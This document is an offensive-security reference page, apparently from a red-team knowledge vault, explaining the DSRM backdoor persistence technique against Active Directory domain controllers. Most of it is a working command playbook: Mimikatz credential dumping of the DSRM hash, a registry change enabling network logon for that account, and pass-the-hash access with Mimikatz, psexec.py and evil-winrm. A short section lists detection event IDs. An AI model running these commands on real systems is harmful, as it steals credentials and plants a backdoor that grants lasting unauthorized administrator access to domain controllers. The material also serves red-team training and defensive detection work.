---
title: "Attack #62 — DSRM Backdoor Abuse"
description: "Every DC has a Directory Services Restore Mode (DSRM) administrator account with a separate password set during DC promotion. By default, this account…"
category: active-directory
subcategory: "Persistence"
tags: ["active-directory", "ntlm", "privilege-escalation", "hashing"]
tools: ["Mimikatz", "Evil-WinRM", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Eight/🟤 Attack #62 — DSRM Backdoor Abuse.md"
---
# 🟤 Attack #62 — DSRM Backdoor Abuse

***

## 📖 How It Works

Every DC has a **Directory Services Restore Mode (DSRM)** administrator account with a separate password set during DC promotion. By default, this account can't be used for network logons. However, modifying the registry key `DsrmAdminLogonBehavior` to `2` allows the DSRM administrator to authenticate over the network — creating a **persistent backdoor** that survives AD credential resets, KRBTGT rotation, and even domain trust rebuilds.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin / SYSTEM on DC** | To modify registry and dump DSRM hash |

***

## 💻 Full Commands

```powershell
# ── Step 1: Dump DSRM password hash ──────────────────────────────────────────
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
# Look for: Administrator (local) — this is the DSRM account hash

# ── Step 2: Enable network logon for DSRM ────────────────────────────────────
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
# Value 0 = DSRM only in restore mode (default)
# Value 1 = DSRM when AD DS is stopped
# Value 2 = DSRM always allowed for network logon ← what we want

# ── Step 3: Use DSRM hash for network access ─────────────────────────────────
# PtH with the DSRM Administrator hash:
sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:<DSRM_HASH> /run:cmd.exe
# Note: /domain is the DC hostname, NOT the domain — this is the local admin

# Result: Can access DC01 as .\Administrator forever
```

```bash
# ── From Linux — PtH with DSRM hash ──────────────────────────────────────────
psexec.py ./Administrator@DC01.corp.local -hashes :<DSRM_HASH>
evil-winrm -i DC01.corp.local -u Administrator -H <DSRM_HASH>
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4657** | Security Log (DC) | Registry modification — DsrmAdminLogonBehavior created/changed |
| **4624** | Security Log (DC) | Local Administrator logon on DC (not domain admin) |

***

## 🔗 Attack Chain Context

```
[DSRM Backdoor] ──→ Permanent DC Access via Local Admin Account
         │
         ├──→ 🔒 Survives: KRBTGT rotation, DA password resets, trust rebuilds
         ├──→ 🔗 Only detected by: monitoring DsrmAdminLogonBehavior registry key
         └──→ 💀 Defeated by: monitor registry, never set DsrmAdminLogonBehavior to 2
```

***

> ✅ **Attack #62 — DSRM Backdoor complete.**
